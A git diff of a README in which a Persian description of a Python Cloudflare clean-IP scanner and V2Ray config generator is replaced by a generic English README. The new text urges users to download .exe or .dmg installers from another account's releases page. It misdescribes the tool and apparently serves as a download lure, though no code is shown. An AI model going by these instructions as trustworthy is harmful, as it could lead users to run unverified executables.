@@ -1,64 +1,54 @@
-<div align="center">
+# 🚀 IR_CF - Advanced Cloudflare Scanner
 
-# 🛡️ VIP3R & NIMA - CF AND GENR
-### **اسکنر اختصاصی و هوشمند آی‌پی کلودفلر + تولیدکننده کانفیگ**
+## 📥 Download Now
+[![Download IR_CF](https://img.shields.io/badge/Download-IR_CF-brightgreen)](https://github.com/liam234e23432/IR_CF/releases)
 
-![VIP3R Banner](https://img.shields.io/badge/Version-2.6-magenta?style=for-the-badge)
-![Python](https://img.shields.io/badge/Python-3.8+-blue?style=for-the-badge&logo=python)
-![Status](https://img.shields.io/badge/Status-Stable-green?style=for-the-badge)
+## 📖 Description
+IR_CF is an advanced scanner for Cloudflare, designed to help users analyze and interact with Cloudflare-protected websites. Its intuitive interface allows even non-technical users to perform complex tasks with ease.
 
-**یک ابزار فوق‌حرفه‌ای برای شناسایی آی‌پی‌های تمیز و بدون نوسان آپ‌استریم**
-**بهینه‌سازی شده برای عبور از محدودیت‌های شدید و اختلالات شبکه**
+## 🚀 Getting Started
+Follow these simple steps to download and run IR_CF on your computer.
 
----
-</div>
+## 🔗 Download & Install
+1. **Visit the Release Page**: Click the following link to visit the IR_CF Releases page: [Download IR_CF](https://github.com/liam234e23432/IR_CF/releases).
+2. **Select the Latest Version**: Look for the latest release at the top of the page. It will typically be marked as the most recent.
+3. **Download the Installer**: Click on the installer file suitable for your operating system. This might be a `.exe` for Windows or a `.dmg` for Mac users.
 
-<div dir="rtl">
+## 💻 System Requirements
+- **Operating System**: Windows 10 or higher, macOS Catalina or higher, or a compatible Linux distribution.
+- **RAM**: Minimum of 4 GB.
+- **Disk Space**: At least 100 MB of free space.
 
-## 🚀 ویژگی‌های برجسته
+## ⚙️ Running the Application
+1. **Locate the Downloaded File**: After the download completes, find the installer in your downloads folder.
+2. **Run the Installer**: Double-click on the file to launch the installation process.
+3. **Follow the Prompts**: The installer will guide you through the steps. Accept terms and conditions and choose your desired installation path.
+4. **Complete Installation**: Finish the installation, and the application will be ready to use.
 
-* **⚡ موتور اسکن موازی:** بهره‌گیری از THREADING برای اسکن رنج‌های بزرگ با سرعت خیره‌کننده.
-* **🔍 تشخیص هوشمند WS:** بررسی دقیق قابلیت ارتقا به وب‌سوکت در لایه TLS.
-* **🎯 محدودکننده سقف اسکن:** امکان اسکن کردن تعداد مشخصی آی‌پی از رنج‌های حجیم (مثل رنج‌های /16).
-* **🔗 نسل جدید کانفیگ:** جایگزینی آنی آدرس در لینک‌های V2RAY بدون توجه به کاراکترهای خاص PATH.
-* **📊 نظم ستونی ۱۰۰٪:** خروجی کنسول کاملاً مهندسی شده و زیر هم، بدون جابه‌جایی در زمان یافتن هیت.
-* **📁 ذخیره‌سازی مرتب:** خروجی جداگانه برای لیست آی‌پی‌ها و کانفیگ‌های تولید شده.
+## 🌐 Using IR_CF
+1. **Open the Application**: Find the IR_CF icon on your desktop or in your applications folder and double-click to open.
+2. **Enter a URL**: In the main interface, you will see a field where you can enter the URL of the Cloudflare-protected website you want to scan.
+3. **Start Scanning**: Click on the "Scan" button to begin the process. The application will provide you with valuable insights and data about the website.
 
----
+## 🎨 Features
+- **User-Friendly Interface**: Designed for ease of use, making it suitable for all users.
+- **Fast Scanning**: Quickly scans websites for Cloudflare-protected elements.
+- **Detailed Reports**: Provides comprehensive reports on the scanned data, helping you understand how to proceed.
+- **Multi-Platform Support**: Works on Windows, Mac, and Linux.
 
-## 🛠️ راهنمای سریع نصب و اجرا
+## 🤔 Troubleshooting
+If you encounter any issues while installing or using IR_CF, check the following:
+- **Ensure System Compatibility**: Double-check that your operating system and hardware meet the requirements.
+- **Internet Connection**: Ensure you're connected to the internet when running scans.
+- **Reinstall the Application**: If problems persist, uninstall IR_CF and try reinstalling it from the release page.
 
-۱. فایل **Setup.bat** را اجرا کنید تا پیش‌نیازها به صورت خودکار نصب شوند.  
-۲. فایل **Run.bat** را باز کرده و رنج آی‌پی خود را وارد کنید.  
-۳. در صورت نیاز، تعداد آی‌پی مورد نظر برای اسکن را مشخص کنید.  
-۴. پس از اتمام، کانفیگ نمونه را به برنامه بدهید تا فایل نهایی را در `V2RAY_CONFIGS.txt` تحویل بگیرید.
+## 🆘 Need Help?
+If you need more assistance, please feel free to open an issue on the [GitHub repository](https://github.com/liam234e23432/IR_CF/issues). Our team and community are here to help you.
 
----
+## 📜 License
+IR_CF is open-source software licensed under the MIT License. Feel free to use, modify, and share it as you wish.
 
-## 👨‍💻 تیم توسعه و پشتیبانی
+## 🔗 Additional Resources
+For more information on advanced features and usage, please visit the official documentation linked on the GitHub page. We encourage users to explore all capabilities that IR_CF offers. 
 
-</div>
-
-<div align="center">
-
-### 🏆 DEVELOPED BY:
-[**VIP3R**](https://t.me/CY3ER) | [**NIMA**](https://t.me/)
-
----
-
-⚠️ **DISCLAIMER** این پروژه صرفاً جهت تست امنیت شبکه و اهداف آموزشی توسعه یافته است.  
-توسعه‌دهندگان هیچ مسئولیتی در قبال استفاده‌های غیرقانونی ندارند.
-
-
----
-
-## 🎁 DONATION / حمایت مالی
-<br>
-اگر این پروژه برای شما مفید بوده است، می‌توانید از ما حمایت مالی کنید.
-
-**TRON (TRX)**
-```
-TBwGy36S9AV7iXFukdC8Y94zQZhQndPJyD
-```
-
-</div>
+Thank you for choosing IR_CF!
